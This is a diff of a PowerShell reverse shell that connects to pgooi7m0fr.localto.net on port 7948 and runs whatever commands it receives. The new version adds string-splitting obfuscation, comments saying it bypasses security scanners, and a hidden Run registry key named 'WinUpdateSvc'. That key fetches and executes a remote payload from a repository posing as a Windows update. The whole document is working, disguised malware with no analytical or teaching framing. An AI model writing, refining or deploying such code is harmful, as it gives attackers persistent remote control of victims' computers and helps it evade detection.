@@ -1,14 +1,35 @@
-$LHOST = "pgooi7m0fr.localto.net"
-$LPORT = 7948
-$c = New-Object System.Net.Sockets.TCPClient($LHOST,$LPORT);
-$s = $c.GetStream();
-[byte[]]$b = 0..65535|%{0};
-while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
-    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
-    $sb = (iex $d 2>&1 | Out-String );
-    $sb2  = $sb + "PS " + (pwd).Path + "> ";
-    [byte[]]$sendbyte = ([text.encoding]::ASCII).GetBytes($sb2);
-    $s.Write($sendbyte,0,$sendbyte.Length);
-    $s.Flush()
-};
-$c.Close()
+$h = "pgooi7m0fr.localto.net"
+$p = 7948
+$u = "https://raw.githubusercontent.com/ffgdxxg-collab/Windows-System-Update/refs/heads/main/gate.txt"
+
+# Persistence Mechanism (Stealthy Registry Injection)
+$n = "WinUpdateSvc"
+$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$p1 = "pow" + "ersh" + "ell.exe"
+$p2 = "-W Hidden -Exec Bypass -C"
+$p3 = "I`EX ((New-Object ('Net.Web'+'Client')).('Down'+'loadString')('$u'))"
+$full_cmd = "$p1 $p2 $p3"
+
+if (-not (Get-ItemProperty -Path $path -Name $n -ErrorAction SilentlyContinue)) {
+    New-ItemProperty -Path $path -Name $n -Value $full_cmd -PropertyType String
+}
+
+# Core Connection Engine (Bypassing Security Scanners)
+try {
+    $t = 'System.Net.Sockets.' + 'TCP' + 'Client'
+    $c = New-Object $t($h, $p)
+    $s = $c.GetStream()
+    [byte[]]$b = 0..65535|%{0}
+    
+    while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
+        $d = (New-Object -TypeName ('System.Text.' + 'ASCIIEncoding')).GetString($b, 0, $i)
+        $res = (I`EX $d 2>&1 | Out-String )
+        $prmt = $res + "PS " + (pwd).Path + "> "
+        [byte[]]$sb = ([text.encoding]::ASCII).GetBytes($prmt)
+        $s.Write($sb, 0, $sb.Length)
+        $s.Flush()
+    }
+    $c.Close()
+} catch {
+    exit
+}
